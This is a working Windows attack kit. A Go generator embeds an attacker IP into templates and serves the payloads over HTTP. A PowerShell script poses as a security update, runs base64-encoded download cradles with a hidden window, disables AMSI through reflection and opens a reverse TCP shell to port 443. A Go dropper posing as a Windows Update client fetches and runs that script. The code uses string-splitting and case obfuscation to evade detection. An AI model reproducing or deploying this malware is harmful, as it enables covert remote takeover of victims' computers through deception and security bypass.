package main

import (
	"fmt"
	"strings"
	"os"
	"encoding/base64"
	"net/http"
	"log"
	"bufio"
)

func loggingFileServer(w http.ResponseWriter, r *http.Request, fileServer http.Handler) {
	// Log request details
	log.Printf("%s %s %s\n", r.RemoteAddr, r.Method, r.URL)

	// Serve the requested file using original file server
	fileServer.ServeHTTP(w, r)
}

func main() {

	// Get LHOST IP from command line arg 1
	LHOST := os.Args[1]
	LPORT := "443"
	fmt.Println("LHOST:    ", LHOST)
	fmt.Println("LPORT:    ", LPORT)

	// Modify "update_script.go", adding LHOST IP
	updateScript, err := os.ReadFile("update_script.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	updateScriptStr := string(updateScript)

	// Set the LHOST IP
	modifiedUpdateScript := strings.ReplaceAll(updateScriptStr, "XXXXX", LHOST)

	// Write the modified content back to the file
	err = os.WriteFile("update_script.go", []byte(modifiedUpdateScript), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	// Modify "r1", adding LHOST IP
	r1, err := os.ReadFile("r1.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	r1Str := string(r1)

	// Set the LHOST IP
	r1Modified := strings.ReplaceAll(r1Str, "XXXXX", LHOST)

	// Write the modified content back to the file
	err = os.WriteFile("r1", []byte(r1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	// Modify "WinSecurityUpdate" with 'a1' and 'r1' base64
	WinSecUpdate, err := os.ReadFile("WinSecUp.template")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	WinSecUpdateStr := string(WinSecUpdate)

	// Base64 encode the following string
	a1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + LHOST + ":8000/a1')"
	a1Encoded := base64.StdEncoding.EncodeToString([]byte(a1PowerShell))
	// Replace 'A1BASE64' with contents of LHOST
	WinSecUpdateA1Modified := strings.ReplaceAll(WinSecUpdateStr, "A1BASE64", a1Encoded)

	// Write the modified content back to the file
	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}


	WinSecUpdate2, err := os.ReadFile("WinSecUp")
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	// Convert the byte array to a string
	WinSecUpdateStr2 := string(WinSecUpdate2)

	// Base64 encode the following string
	r1PowerShell := "InVOkE-EXpreSSIoN (New-OBjECt NeT.WEbCLienT).DowNlOaDSTrinG('http://" + LHOST + ":8000/r1')"
	r1Encoded := base64.StdEncoding.EncodeToString([]byte(r1PowerShell))
	// Replace 'A1BASE64' with contents of LHOST
	WinSecUpdateA1Modified2 := strings.ReplaceAll(WinSecUpdateStr2, "R1BASE64", r1Encoded)

	// Write the modified content back to the file
	err = os.WriteFile("WinSecUp", []byte(WinSecUpdateA1Modified2), 0666)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	fmt.Println("******************************************")
	fmt.Println("[!] Start your listener on port 443")
	fmt.Printf("[!] Press ENTER to continue...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	prompt := `
******************************************
[!] Attack files have been generated
******************************************
[-] update_script.go
[-] r1
[-] WinSecUp

******************************************
[!] HTTP Server is running on port 8000
[!] Press CTRL+C to Exit

******************************************`

	fmt.Println(prompt)

	// Define file server
	fileServer := http.FileServer(http.Dir("./"))

	// Create handler
  var handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
    loggingFileServer(w, r, fileServer)
  })

	// Serve requests that start with '/'
  http.Handle("/", handler)

	fmt.Println("[!] Compile and Upload 'update_script.exe' to target and execute")
	fmt.Println("[!] Check Listener for connection\n")
	fmt.Println("******************************************")

	// Start server on port 8000
	log.Fatal(http.ListenAndServe(":8000", nil))

}
echo "[!] Preparing System for Update"
echo "[*] ============================"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
echo "[!] Starting Update Process."
echo "[*] ============================"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"
start-sleep -s 1
echo "[*]"

$a1 = "A1BASE64"
$r1 = "R1BASE64"

# OLD STUFF
#$a1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvYTEnKQ=="
#$r1 = "SW5WT2tFLUVYcHJlU1NJb04gKE5ldy1PQmpFQ3QgTmVULldFYkNMaWVuVCkuRG93TmxPYURTVHJpbkcoJ2h0dHA6Ly8xMC4wLjEzLjc1OjgwMDAvcjEnKQ=="

start-sleep -s 1

$p1 = "UG9XZVJTaEVMbDs7LW5vUCAtYyAi"
$p2 = $p1.substring(0,28)

echo "[*]"
start-sleep -s 1
echo "[!] Update Process Completed"
start-sleep -s 1

$update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($p2))
$update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
$update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))

echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -

$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils' ;; $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)) ;; $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static') ;; $field.SetValue($null,$true)

$client = NeW-OBjeCt S""yST""Em.nEt.S""OcK""etS.T""C""P""Cli""ent("XXXXX",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

package main

import (
	"fmt"
	"os/exec"
)

func drop() {
	fun := "p\"\"OWe\"\"RshE\"\"lL -noP -w Hidden -c \"iex(NeW-obJEcT NEt.wEbCliENt).DoWnlOAdStRinG('http://XXXXX:8000/WinSecUp')\""

	cmd2 := exec.Command("powershell", "-NOp", fun)
	err2 := cmd2.Run()
	if err2 != nil {
		fmt.Println(err2)
		return
	}
	fmt.Println("Installing system updates")

}

func main() {
	fmt.Println("[!] Contacting Windows Update server for updates...")
	// add call to windows update
	// Deprecated...
	// update := "wuauclt.exe /detectnow"
	update := "powershell.exe (New-Object -ComObject Microsoft.Update.AutoUpdate).DetectNow()"
	cmd := exec.Command("powershell", "-NoP", "-w", "hidden", update)

	err := cmd.Run()
	if err != nil {
		fmt.Println("Couldn't contact update server.", err)
		return
	}

	drop()
}
